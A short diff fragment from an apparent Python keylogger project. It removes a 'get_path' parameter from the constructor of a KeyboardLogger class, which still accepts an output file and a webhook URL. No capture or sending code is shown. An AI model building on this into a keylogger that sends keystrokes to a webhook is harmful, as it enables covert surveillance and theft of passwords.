@@ -3,7 +3,7 @@ import os
 import requests
 
 class KeyboardLogger:
-    def __init__(self, output_file, webhook_url, get_path):
+    def __init__(self, output_file, webhook_url):
         self.output_file = output_file
         self.caps_lock_active = False
         self.total_keys = 0
